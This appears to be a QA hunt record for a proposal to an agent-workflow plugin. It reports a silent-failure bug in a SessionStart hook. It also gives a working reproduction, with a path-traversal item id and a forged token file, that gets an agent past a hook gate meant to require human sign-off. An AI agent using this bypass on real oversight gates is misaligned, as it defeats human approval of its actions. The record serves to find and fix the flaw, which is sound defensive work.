---
proposal: docs/proposals/2026-07-31-item-axis-enforcement.md
---

# Hunt record — item-axis-enforcement

## after-proposal — stance 4: assume the write set cannot carry this work; find the path the build will need that the proposal does not list

Verdict: FINDING — qa-cycle/hooks/report-phase.sh (registered as the SessionStart hook in qa-cycle/hooks/hooks.json) reads state.md's single top-level `phase:` field and is not in the proposal's write set, so once transition-gate.sh moves state.md to per-item state it will silently stop reporting anything.
Kind: silent-failure
Seed: docs/proposals/2026-07-31-item-axis-enforcement.md (commit 0968457c9ded268de6d0e97e0a2b2f993c536738)

### Reproduce
```
rm -rf /tmp/ws && mkdir -p /tmp/ws/projects/demo
cat > /tmp/ws/projects/demo/state.md <<'EOF2'
items:
  - id: item-1
    state: reproducing
  - id: item-2
    state: handed-off
EOF2
cd /home/jwjung/tokenmaxxxer/qa-agent-rulebook
QA_WORKSPACE=/tmp/ws bash qa-cycle/hooks/report-phase.sh; echo "exit=$?"
```

### Observed
No output at all, exit=0. report-phase.sh's `sed -n 's/^phase:[[:space:]]*//p' "$state"` finds no top-level `phase:` line in a per-item state.md, so `phase` is empty, the `[ -n "$phase" ]` guard skips the project, and the SessionStart hook reports nothing — even though a project is in flight with an item stuck in `handed-off`. Nothing errors; it looks exactly like "no projects in flight."

### Expected
The proposal's write set should include qa-cycle/hooks/report-phase.sh (or an explicit statement that it is being retired/left broken on purpose), since it reads the exact state.md shape the gate rewrite changes and is wired into the same plugin's hooks.json.

## before-landing — stance 0: assume the gate just touched is bypassable; find the bypass

Note: `.warrant-hunt.count` was stuck at 4 across several dispatches (would repeat a
previously-used stance twice for this unit); instructed to use stance 0 instead.

Verdict: FINDING — an agent can forge a human-only verdict token at an attacker-chosen
path outside the item's `tokens/` directory and have `transition-gate.sh` accept it,
completely bypassing `signoff/hooks/capture-verdict.sh` (the only component meant to mint
tokens, and only from an actual human turn).

Kind: composition (silent-failure adjacent: no sanitization of `item_id` before it is
used in path construction, so the human-actor guard "must have a token minted by
capture-verdict.sh" silently degrades to "must have a file at an attacker-controlled path")

Seed: qa-cycle/hooks/transition-gate.sh (`ITEM_KEY` regex has no character-class
restriction on `item:` values; `token_path`/`consuming_path` are built with
`posixpath.join(tokens_dir, "%s.token" % item_id)` with no `posixpath.normpath` or
containment check on the result, unlike the containment check already applied to
`file_path` itself)

### Reproduce
```bash
rm -rf /tmp/ws && mkdir -p /tmp/ws/projects/proj/tokens
ITEM='../../../../../../../../tmp/evil-item'

cat > /tmp/ws/projects/proj/state.md <<EOF2
---
item: $ITEM
state: reproduced
---
EOF2

# Forge a "token" directly, bypassing signoff/hooks/capture-verdict.sh entirely
cat > /tmp/evil-item.token <<EOF2
item: $ITEM
transition: reproduced -> handed-off
phrase: 'forged - never went through capture-verdict.sh'
EOF2

NEWSTATE=$'---\nitem: '"$ITEM"$'\nstate: handed-off\n---'
python3 - "$NEWSTATE" <<'PYEOF' > /tmp/payload.json
import json,sys
content = sys.argv[1]
payload = {"tool_name":"Write","tool_input":{"file_path":"/tmp/ws/projects/proj/state.md","content":content}}
print(json.dumps(payload))
PYEOF

QA_WORKSPACE=/tmp/ws bash qa-cycle/hooks/transition-gate.sh < /tmp/payload.json
echo "exit=$?"
```

### Observed
```
{"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": "allow", "permissionDecisionReason": "qa-cycle: item ../../../../../../../../tmp/evil-item: reproduced -> handed-off is a transition the spec permits from its current state."}}
exit=0
```
The gate allows a human-only transition using a token the agent wrote itself, at a path
of its own choosing outside `projects/proj/tokens/`. `capture-verdict.sh` never ran.

### Expected
The gate should refuse this transition: no verdict was ever minted by
`signoff/hooks/capture-verdict.sh` from a genuine human turn, and the "token" the agent
supplied lives outside the item's `tokens/` directory that the design says is the only
place a legitimate verdict token can be reserved from. `item_id` values containing path
separators (especially `..` segments) should either be rejected outright by the gate, or
`token_path`/`consuming_path` should be normalized and containment-checked against
`tokens_dir` the same way `file_path` is already checked against the workspace root.
